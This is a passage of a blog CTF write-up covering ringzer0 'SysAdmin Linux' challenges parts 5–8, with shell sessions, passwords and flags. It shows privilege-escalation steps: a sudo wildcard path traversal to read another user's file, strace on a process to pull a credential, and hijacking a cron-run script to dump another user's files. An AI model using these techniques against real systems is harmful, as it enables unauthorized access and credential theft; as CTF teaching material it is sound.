+<span class="c">#[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"</span>
+
+<span class="c"># set variable identifying the chroot you work in (used in the prompt below)</span>
+<span class="k">if</span> <span class="o">[</span> -z <span class="s2">"</span><span class="si">${</span><span class="nv">debian_chroot</span><span class="k">:-</span><span class="si">}</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -r /etc/debian_chroot <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nv">debian_chroot</span><span class="o">=</span><span class="k">$(</span>cat /etc/debian_chroot<span class="k">)</span>
+<span class="k">fi</span>
+
+<span class="c"># set a fancy prompt (non-color, unless we know we "want" color)</span>
+<span class="k">case</span> <span class="s2">"</span><span class="nv">$TERM</span><span class="s2">"</span> in
+    xterm-color<span class="o">)</span> <span class="nv">color_prompt</span><span class="o">=</span>yes<span class="p">;;</span>
+<span class="k">esac</span>
+
+<span class="c"># uncomment for a colored prompt, if the terminal has the capability; turned</span>
+<span class="c"># off by default to not distract the user: the focus in a terminal window</span>
+<span class="c"># should be on the output of commands, not on the prompt</span>
+<span class="c">#force_color_prompt=yes</span>
+<span class="k">if</span> <span class="o">[</span> -n <span class="s2">"</span><span class="nv">$force_color_prompt</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="k">if</span> <span class="o">[</span> -x /usr/bin/tput <span class="o">]</span> <span class="o">&amp;&amp;</span> tput setaf <span class="m">1</span> &gt;<span class="p">&amp;</span>/dev/null<span class="p">;</span> <span class="k">then</span>
+        <span class="c"># We have color support; assume it's compliant with Ecma-48</span>
+        <span class="c"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span>
+        <span class="c"># a case would tend to support setf rather than setaf.)</span>
+        <span class="nv">color_prompt</span><span class="o">=</span>yes
+    <span class="k">else</span>
+        <span class="nv">color_prompt</span><span class="o">=</span>
+    <span class="k">fi</span>
+<span class="k">fi</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$color_prompt</span><span class="s2">"</span> <span class="o">=</span> yes <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nv">PS1</span><span class="o">=</span><span class="s1">'${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '</span>
+<span class="k">else</span>
+    <span class="nv">PS1</span><span class="o">=</span><span class="s1">'${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '</span>
+<span class="k">fi</span>
+<span class="nb">unset </span>color_prompt force_color_prompt
+
+<span class="c"># If this is an xterm set the title to user@host:dir</span>
+<span class="k">case</span> <span class="s2">"</span><span class="nv">$TERM</span><span class="s2">"</span> in
+xterm*<span class="p">|</span>rxvt*<span class="o">)</span>
+    <span class="nv">PS1</span><span class="o">=</span><span class="s2">"\[\e]0;</span><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span><span class="s2">\u@\h: \w\a\]</span><span class="nv">$PS1</span><span class="s2">"</span>
+    <span class="p">;;</span>
+*<span class="o">)</span>
+    <span class="p">;;</span>
+<span class="k">esac</span>
+
+<span class="c"># enable color support of ls and also add handy aliases</span>
+<span class="nb">alias </span><span class="nv">reveal</span><span class="o">=</span><span class="s2">"openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"</span>
+<span class="k">if</span> <span class="o">[</span> -x /usr/bin/dircolors <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">test</span> -r ~/.dircolors <span class="o">&amp;&amp;</span> <span class="nb">eval</span> <span class="s2">"</span><span class="k">$(</span>dircolors -b ~/.dircolors<span class="k">)</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">eval</span> <span class="s2">"</span><span class="k">$(</span>dircolors -b<span class="k">)</span><span class="s2">"</span>
+    <span class="nb">alias </span><span class="nv">ls</span><span class="o">=</span><span class="s1">'ls --color=auto'</span>
+    <span class="c">#alias dir='dir --color=auto'</span>
+    <span class="c">#alias vdir='vdir --color=auto'</span>
+
+    <span class="c">#alias grep='grep --color=auto'</span>
+    <span class="c">#alias fgrep='fgrep --color=auto'</span>
+    <span class="c">#alias egrep='egrep --color=auto'</span>
+<span class="k">fi</span>
+
+<span class="c"># some more ls aliases</span>
+<span class="c">#alias ll='ls -l'</span>
+<span class="c">#alias la='ls -A'</span>
+<span class="c">#alias l='ls -CF'</span>
+
+<span class="c"># Alias definitions.</span>
+<span class="c"># You may want to put all your additions into a separate file like</span>
+<span class="c"># ~/.bash_aliases, instead of adding them here directly.</span>
+<span class="c"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span>
+
+<span class="k">if</span> <span class="o">[</span> -f ~/.bash_aliases <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    . ~/.bash_aliases
+<span class="k">fi</span>
+
+<span class="c"># enable programmable completion features (you don't need to enable</span>
+<span class="c"># this, if it's already enabled in /etc/bash.bashrc and /etc/profile</span>
+<span class="c"># sources /etc/bash.bashrc).</span>
+</pre></div>
+<p>Do you see sth suspicious? No? Well, I do!</p>
+<div class="highlight"><pre><span class="nb">alias </span><span class="nv">reveal</span><span class="o">=</span><span class="s2">"openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"</span>
+</pre></div>
+<p>Let's decrypt the file:</p>
+<div class="highlight"><pre>oracle@forensics:~<span class="nv">$ </span>reveal
+FLAG-IaFOjjFWazycSg0lbVO3T8ZTvz
+</pre></div>
+<h2 id="1b2b191cbfd827a024dd807af7c915a0">SysAdmin Part 6</h2>
+<p>Login as <code>trinity</code>:</p>
+<div class="highlight"><pre><span class="nv">$ </span>sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
+
+trinity@forensics:~<span class="nv">$ </span>ls -la
+total 28
+drwxr-xr-x  <span class="m">2</span> trinity trinity <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2014</span> .
+drwxr-xr-x <span class="m">10</span> root    root    <span class="m">4096</span> Jun <span class="m">12</span>  <span class="m">2014</span> ..
+lrwxrwxrwx  <span class="m">1</span> root    root       <span class="m">9</span> Mar  <span class="m">9</span>  <span class="m">2014</span> .bash_history -&gt; /dev/null
+-rwxr--r--  <span class="m">1</span> trinity trinity  <span class="m">236</span> Oct <span class="m">29</span>  <span class="m">2015</span> .bash_logout
+-rwxr--r--  <span class="m">1</span> trinity trinity <span class="m">2638</span> Jul <span class="m">19</span> 06:37 .bashrc
+-rw-r-----  <span class="m">1</span> neo     neo      <span class="m">124</span> Sep <span class="m">20</span>  <span class="m">2015</span> phonebook
+-rwxr--r--  <span class="m">1</span> trinity trinity  <span class="m">675</span> Dec <span class="m">10</span>  <span class="m">2015</span> .profile
+-rwxr-----  <span class="m">1</span> trinity trinity   <span class="m">23</span> Jul  <span class="m">5</span> 16:50 .vimrc
+</pre></div>
+<p>Obviously only <code>neo:neo</code> can read <code>phonebook</code>. Now let's check for <code>sudo</code>:</p>
+<div class="highlight"><pre>trinity@forensics:~<span class="nv">$ </span>sudo -l
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> trinity:
+Matching Defaults entries <span class="k">for</span> trinity on this host:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, insults
+
+User trinity may run the following commands on this host:
+    <span class="o">(</span>neo<span class="o">)</span> /bin/cat /home/trinity/*
+</pre></div>
+<p>Now read the files:</p>
+<div class="highlight"><pre>trinity@forensics:~<span class="nv">$ </span>sudo -u neo /bin/cat /home/trinity/*
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+
+
+
+
+copy made by Cypher copy utility on /home/neo/phonebook
+</pre></div>
+<p>Hmmm, nothing special about it. However, you can use the wildcard to go into the parent directory and 
+finally into <code>/home/neo/</code>:</p>
+<div class="highlight"><pre>trinity@forensics:~<span class="nv">$ </span>sudo -u neo /bin/cat /home/trinity/../neo/phonebook
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+
+
+
+change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
+don<span class="err">'</span>t forget to remove this :<span class="o">)</span>
+</pre></div>
+<p>Fail :) </p>
+<h2 id="c03a05228c09a8ae4d71a2b80581065f">SysAdmin Part 7</h2>
+<div class="highlight"><pre>% sshpass -p FLAG-lRGLKGh2895wIAoOvcBbgk4oL ssh neo@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____<span class="o">(</span>_<span class="o">)</span>___  ____ _____  ___  _____/ __ <span class="se">\/</span> /____  ____ _____ ___ 
+  / ___/ / __ <span class="se">\/</span> __ <span class="sb">`</span>/_  / / _ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\/</span> __ <span class="sb">`</span>/ __ <span class="sb">`</span>__ <span class="se">\</span>
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/<span class="se">\_</span>_, / /___/<span class="se">\_</span>__/_/   <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="se">\_</span>_,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>_ _  ___   / __<span class="p">|</span>_   _<span class="p">|</span> __<span class="p">|</span>
+                            / _ <span class="se">\ </span><span class="s1">' \| | | '</span> <span class="se">\/</span> -_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> _<span class="p">|</span> 
+                            <span class="se">\_</span>__/_<span class="o">||</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="o">||</span>_<span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  
+
+
+You have mail.
+neo@forensics:~<span class="nv">$ </span>
+</pre></div>
+<p>Let's have a look at running processes:</p>
+<div class="highlight"><pre>neo@forensics:~<span class="nv">$ </span>ps fl -u neo  
+F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">32505</span> <span class="m">32503</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:01 /bin/monitor
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">32073</span> <span class="m">32071</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:01 /bin/monitor
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">31844</span> <span class="m">31842</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:04 /bin/monitor
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">31624</span> <span class="m">31622</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:03 /bin/monitor
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">31471</span> <span class="m">31469</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:02 /bin/monitor
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">31078</span> <span class="m">31076</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:02 /bin/monitor
+<span class="m">4</span>  <span class="m">1003</span> <span class="m">30040</span> <span class="m">30038</span>  <span class="m">20</span>   <span class="m">0</span>   <span class="m">3944</span>   <span class="m">256</span> -      Ss   ?          0:02 /bin/monitor
+<span class="o">[</span>...<span class="o">]</span>
+</pre></div>
+<p>Since we can read <code>/bin/monitor</code> as user <code>neo</code> (and <code>/bin/monitor</code> was started using 
+<code>sudo neo -c /bin/monitor</code>) we should be able to <strong>trace</strong> its syscalls (since we are
+allowed to attach to a process running as user <code>neo</code>):</p>
+<div class="highlight"><pre>neo@forensics:~<span class="nv">$ </span>strace -p32505
+Process <span class="m">32505</span> attached - interrupt to quit
+restart_syscall<span class="o">(</span>&lt;... resuming interrupted call ...&gt;<span class="o">)</span> <span class="o">=</span> 0
+write<span class="o">(</span>4294967295, <span class="s2">"telnet 127.0.0.1 23\n"</span>, 20<span class="o">)</span> <span class="o">=</span> -1 EBADF <span class="o">(</span>Bad file descriptor<span class="o">)</span>
+write<span class="o">(</span>4294967295, <span class="s2">"user\n"</span>, 5<span class="o">)</span>          <span class="o">=</span> -1 EBADF <span class="o">(</span>Bad file descriptor<span class="o">)</span>
+write<span class="o">(</span>4294967295, <span class="s2">"FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n"</span>, 31<span class="o">)</span> <span class="o">=</span> -1 EBADF <span class="o">(</span>Bad file descriptor<span class="o">)</span>
+write<span class="o">(</span>4294967295, <span class="s2">"get-cpuinfo\n"</span>, 12<span class="o">)</span>  <span class="o">=</span> -1 EBADF <span class="o">(</span>Bad file descriptor<span class="o">)</span>
+rt_sigprocmask<span class="o">(</span>SIG_BLOCK, <span class="o">[</span>CHLD<span class="o">]</span>, <span class="o">[]</span>, 8<span class="o">)</span> <span class="o">=</span> 0
+rt_sigaction<span class="o">(</span>SIGCHLD, NULL, <span class="o">{</span>SIG_DFL, <span class="o">[]</span>, 0<span class="o">}</span>, 8<span class="o">)</span> <span class="o">=</span> 0
+rt_sigprocmask<span class="o">(</span>SIG_SETMASK, <span class="o">[]</span>, NULL, 8<span class="o">)</span> <span class="o">=</span> 0
+nanosleep<span class="o">({</span>10, 0<span class="o">}</span>,
+</pre></div>
+<p>Bingo! The flag is <code>FLAG-a4UVY5HJQO5ddLc5wtBps48A3</code>. </p>
+<h2 id="365b3fdae9fbff22284a840f7dfc5ec5">SysAdmin Part 8</h2>
+<div class="highlight"><pre>% sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____<span class="o">(</span>_<span class="o">)</span>___  ____ _____  ___  _____/ __ <span class="se">\/</span> /____  ____ _____ ___ 
+  / ___/ / __ <span class="se">\/</span> __ <span class="sb">`</span>/_  / / _ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\/</span> __ <span class="sb">`</span>/ __ <span class="sb">`</span>__ <span class="se">\</span>
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/<span class="se">\_</span>_, / /___/<span class="se">\_</span>__/_/   <span class="se">\_</span>___/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="se">\_</span>_,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>_ _  ___   / __<span class="p">|</span>_   _<span class="p">|</span> __<span class="p">|</span>
+                            / _ <span class="se">\ </span><span class="s1">' \| | | '</span> <span class="se">\/</span> -_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> _<span class="p">|</span> 
+                            <span class="se">\_</span>__/_<span class="o">||</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="o">||</span>_<span class="se">\_</span>__<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  
+
+
+You have mail.
+</pre></div>
+<p>I remember some information related to the user <code>cypher</code> during the previous challanges. In fact 
+I think I've seen sth in the files located at <code>/backups</code>:</p>
+<div class="highlight"><pre>morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>cp /backup/* .
+morpheus@forensics:/var/tmp/bk<span class="nv">$ </span><span class="k">for</span> i in *<span class="p">;</span> <span class="k">do</span> tar -xf <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
+morpheus@forensics:/var/tmp/bk<span class="nv">$ </span><span class="k">for</span> i in *<span class="p">;</span> <span class="k">do</span> tar -xf <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
+morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>ls -ltR
+.:
+total 96
+drwxr-xr-x <span class="m">4</span> morpheus morpheus  <span class="m">4096</span> Sep <span class="m">27</span> 04:46 var
+-rwxr-xr-x <span class="m">1</span> morpheus morpheus <span class="m">40960</span> Sep <span class="m">27</span> 04:46 3dab3277410dddca016834f91d172027
+-rwxr-xr-x <span class="m">1</span> morpheus morpheus <span class="m">10240</span> Sep <span class="m">27</span> 04:46 776d27d2a429e63bbc3cb29183417bb2
+-rwxr-xr-x <span class="m">1</span> morpheus morpheus <span class="m">20480</span> Sep <span class="m">27</span> 04:46 c074fa6ec17bb35e168366c43cf4cd19
+-rwxr-xr-x <span class="m">1</span> morpheus morpheus <span class="m">10240</span> Sep <span class="m">27</span> 04:46 ca584b15ae397a9ad45b1ff267b55796
+drwxr-xr-x <span class="m">3</span> morpheus morpheus  <span class="m">4096</span> Sep <span class="m">15</span>  <span class="m">2014</span> home
+drwxr-x--x <span class="m">2</span> morpheus morpheus  <span class="m">4096</span> Mar <span class="m">12</span>  <span class="m">2014</span> tmp
+
+./var:
+total 8
+drwxr-xr-x <span class="m">3</span> morpheus morpheus <span class="m">4096</span> Sep <span class="m">27</span> 04:46 spool
+drwxr-xr-x <span class="m">2</span> morpheus morpheus <span class="m">4096</span> Sep <span class="m">27</span> 04:46 log
+
+./var/spool:
+total 4
+drwxr-xr-x <span class="m">5</span> morpheus morpheus <span class="m">4096</span> Feb <span class="m">25</span>  <span class="m">2014</span> cron
+
+./var/spool/cron:
+total 12
+drwx--x--- <span class="m">2</span> morpheus morpheus <span class="m">4096</span> Mar <span class="m">12</span>  <span class="m">2014</span> crontabs
+drwxr-x--- <span class="m">2</span> morpheus morpheus <span class="m">4096</span> Feb <span class="m">25</span>  <span class="m">2014</span> atjobs
+drwxr-x--- <span class="m">2</span> morpheus morpheus <span class="m">4096</span> Jun  <span class="m">9</span>  <span class="m">2012</span> atspool
+
+./var/spool/cron/crontabs:
+total 4
+-rw------- <span class="m">1</span> morpheus morpheus <span class="m">1126</span> Mar <span class="m">12</span>  <span class="m">2014</span> cypher
+
+./var/spool/cron/atjobs:
+total 0
+
+./var/spool/cron/atspool:
+total 0
+
+./var/log:
+total 40
+-rw-r----- <span class="m">1</span> morpheus morpheus <span class="m">37172</span> Mar <span class="m">12</span>  <span class="m">2014</span> syslog
+
+./home:
+total 4
+drwxr-x--- <span class="m">3</span> morpheus morpheus <span class="m">4096</span> Sep <span class="m">15</span>  <span class="m">2014</span> oracle
+
+./home/oracle:
+total 0
+
+./tmp:
+total 4
+-rwxr-xr-x <span class="m">1</span> morpheus morpheus <span class="m">54</span> Mar <span class="m">12</span>  <span class="m">2014</span> Gathering.py
+</pre></div>
+<p>As you can see there is user cronjob:</p>
+<div class="highlight"><pre>morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>cat ./var/spool/cron/crontabs/cypher
+<span class="c"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span>
+<span class="c"># (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)</span>
+<span class="c"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span>
+<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
+<span class="c"># </span>
+<span class="c"># Each task to run has to be defined through a single line</span>
+<span class="c"># indicating with different fields when the task will be run</span>
+<span class="c"># and what command to run for the task</span>
+<span class="c"># </span>
+<span class="c"># To define the time you can provide concrete values for</span>
+<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
+<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').# </span>
+<span class="c"># Notice that tasks will be started based on the cron's system</span>
+<span class="c"># daemon's notion of time and timezones.</span>
+<span class="c">#</span>
+<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
+<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
+<span class="c">#</span>
+<span class="c"># For example, you can run a backup of all your user accounts</span>
+<span class="c"># at 5 a.m every week with:</span>
+<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+<span class="c">#</span>
+<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
+<span class="c">#</span>
+<span class="c"># m h  dom mon dow   command</span>
+*/3 * * * * python /tmp/Gathering.py
+</pre></div>
+<p>So every 3 minutes <code>python /tmp/Gathering.py</code> gets executed. If we look closer, we'll 
+notice that the Python file is executed as user <code>cypher</code>:</p>
+<div class="highlight"><pre>morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>grep -r <span class="s2">"cypher"</span> *
+Binary file 3dab3277410dddca016834f91d172027 matches
+Binary file 776d27d2a429e63bbc3cb29183417bb2 matches
+Binary file ca584b15ae397a9ad45b1ff267b55796 matches
+tmp/Gathering.py:os.system<span class="o">(</span><span class="s2">"ps aux &gt; /home/cypher/info.txt"</span><span class="o">)</span>
+var/log/syslog:Mar <span class="m">12</span> 22:01:58 forensics crontab<span class="o">[</span>1662<span class="o">]</span>: <span class="o">(</span>cypher<span class="o">)</span> BEGIN EDIT <span class="o">(</span>cypher<span class="o">)</span>
+var/log/syslog:Mar <span class="m">12</span> 22:02:27 forensics crontab<span class="o">[</span>1662<span class="o">]</span>: <span class="o">(</span>cypher<span class="o">)</span> REPLACE <span class="o">(</span>cypher<span class="o">)</span>
+var/log/syslog:Mar <span class="m">12</span> 22:02:27 forensics crontab<span class="o">[</span>1662<span class="o">]</span>: <span class="o">(</span>cypher<span class="o">)</span> END EDIT <span class="o">(</span>cypher<span class="o">)</span>
+var/log/syslog:Mar <span class="m">12</span> 22:03:01 forensics /USR/SBIN/CRON<span class="o">[</span>1682<span class="o">]</span>: <span class="o">(</span>cypher<span class="o">)</span> CMD <span class="o">(</span>python /tmp/Gathering.py<span class="o">)</span>
+var/log/syslog:Mar <span class="m">12</span> 22:06:01 forensics /USR/SBIN/CRON<span class="o">[</span>1857<span class="o">]</span>: <span class="o">(</span>cypher<span class="o">)</span> CMD <span class="o">(</span>python /tmp/Gathering.py<span class="o">)</span>
+var/log/syslog:Mar <span class="m">12</span> 22:09:01 forensics /USR/SBIN/CRON<span class="o">[</span>2269<span class="o">]</span>: <span class="o">(</span>cypher<span class="o">)</span> CMD <span class="o">(</span>python /tmp/Gathering.py<span class="o">)</span>
+</pre></div>
+<p>Finally we want the Python script to read all files under <code>/home/cypher/*</code> and redirect the STDOUT
+to some file:</p>
+<div class="highlight"><pre>morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>touch /tmp/gather.log
+morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>chmod <span class="m">777</span> /tmp/gather.log
+morpheus@forensics:/var/tmp/bk<span class="nv">$ </span>cat /tmp/Gathering.py
+import os
+os.system<span class="o">(</span><span class="s2">"cat /home/cypher/*.* &gt; /tmp/gather.log"</span><span class="o">)</span>
+</pre></div>
+<p>This should do the trick. Now we'll have to wait for the script to get executed. Every 3 minutes means that
+the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.  </p>
+<blockquote>
+<p>Due to some bug related to this challenge, I wasn't able to get the flag yet :) I'm still waiting for the bug to get fixed :D</p>
+</blockquote>
+                </div>
+<hr/>
+<div style="float:left;">
+	Prev: <a href="http://blog.dornea.nu/2016/10/29/ringzer0-ctf-javascript-challenges" align='left'>
+	 ringzer0 CTF - JavaScript challenges
+	</a>
+</div>
+</p>
+
+                <!-- Add comments -->
+<div id="content-comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname="dorneanu";
+				var disqus_identifier = 'ringzer0-ctf-sysadmin-linux';
+			var disqus_url = 'http://blog.dornea.nu/2016/10/30/ringzer0-ctf-sysadmin-linux';
+
+		var disqus_config = function () {
+			this.language = "en";
+		};
+ 
+        
+        (function(){var a=document.createElement("script");a.type="text/javascript";a.async=true;a.src="//"+disqus_shortname+".disqus.com/embed.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)})();</script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div> 
+            </div>
+            <div class="niu2-right-container col-md-2">
+                <div id="niu2-sidebar-meta" class="niu2-sidebar">
+                    <div class="niu2-sidebar-label"><i class="icon-calendar"></i>Published:</div>
+                    <div class="niu2-sidebar-value">2016-10-30 00:00</div>
+                    <div class="niu2-sidebar-label"><i class="icon-pencil"></i>category:</div>
+                    <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
+                    <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ringzer0/">ringzer0</a><sup>5</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>8</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/admin/">admin</a><sup>24</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/linux/">linux</a><sup>22</sup></div>
+                </div>
+
+                <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
+                    <div class="niu2-sidebar-label">
+                        <i id="niu2-sidebar-toc-ctrl" class="icon-open-tocs"></i>Table of contents
+                    </div>
+                    <ul id="niu2-sidebar-toc-list">
+                        <li><a href="#content-heading">ringzer0 CTF - SysAdmin Linux</a></li>
+                        <li><a href='#4a7b6e245caad2efaf1cb51284039140'>SysAdmin Part 1</a></li><li><a href='#50382a1e045d7b8d428b259fd7444848'>SysAdmin Part 2</a></li><li><a href='#2c1ffccb306055f3642a61185921af5a'>SysAdmin Part 3</a></li><li><a href='#02266b5b34bd7aa2b442ea12fad58a29'>SysAdmin Part 4</a></li><li><a href='#46f00bc29c21214db6d5871487d0f227'>SysAdmin Part 5</a></li><li><a href='#1b2b191cbfd827a024dd807af7c915a0'>SysAdmin Part 6</a></li><li><a href='#c03a05228c09a8ae4d71a2b80581065f'>SysAdmin Part 7</a></li><li><a href='#365b3fdae9fbff22284a840f7dfc5ec5'>SysAdmin Part 8</a></li>
+                        <li><a href="#content-comments">Comments</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div id="niu2-toolbar">
+                <ul class="list-unstyled">
+                    <li><a id="niu2-toolbar-ctrlsidebar" href="#" title="Hide Sidebar"><i class="icon-3x icon-hide-sidebar"></i></a></li>
+                </ul>
+                <div id="niu2-toolbar-showsidebar" data-title="Show Sidebar"></div>
+                <div id="niu2-toolbar-github" data-repo=""></div>
+                <div id="niu2-toolbar-bitbucket" data-repo=""></div>
+            </div>
+            <div id="niu2-toc" data-style="fixed"></div>
+        </div>
+
+        <div class="niu2-footer">
+            <div id="body-footer" class="col-md-6 col-md-offset-2">
+                <hr/>
+                <p>
+                    Powered by <a href="https://github.com/getpelican/pelican">Pelican</a>, 
+                    <a href="https://github.com/mawenbao/niu-x2-sidebar">theme</a> built with <a href="https://github.com/twbs/bootstrap">Bootstrap3</a>
+                    by <a href="https://blog.mawenbao.com">Ma Wenbao</a>, icons by 
+                    <a href="https://fortawesome.github.io/Font-Awesome">Font Awesome</a>.
+                </p>
+                <p>
+                    © 2008 - 2016
+                    <a class="niu2-footer-link" href="http://blog.dornea.nu">Victor Dorneanu</a>
+                </p>
+                <p class="niu2-icons">
+                    <a class="niu2-footer-icon" href="https://pgp.mit.edu/pks/lookup?op=get&search=0x18F1AD46FB05E1B7" title="my public key">
+                        <i class="icon-key icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="mailto: no-spam ÄATT dornea DOT nu" title="my email address">
+                        <i class="icon-envelope-o icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="http://github.com/dorneanu" title="my github page">
+                        <i class="icon-github-alt icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="/feeds/rss.xml" title="subscribe my blog">
+                        <i class="icon-rss icon-lg"></i>
+                    </a>
+                </p>
+            </div>
+        </div>
+
+        <script type="text/javascript">
+            var _gaq=_gaq||[];
+            _gaq.push(["_setAccount","UA-7161767-3"]);
+            _gaq.push(["_trackPageview"]);
+            (function(){
+                var b=document.createElement("script");
+                b.type="text/javascript";
+                b.async=true;
+                b.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";
+                var a=document.getElementsByTagName("script")[0];
+                a.parentNode.insertBefore(b,a)
+            })();
+        </script>
+        <div id="niu2-pygments" data-theme="github"></div>
+        <div id="niu2-lazy-load" data-loading-txt="Loading image" data-loading-icon="icon-spin icon-spinner"></div>
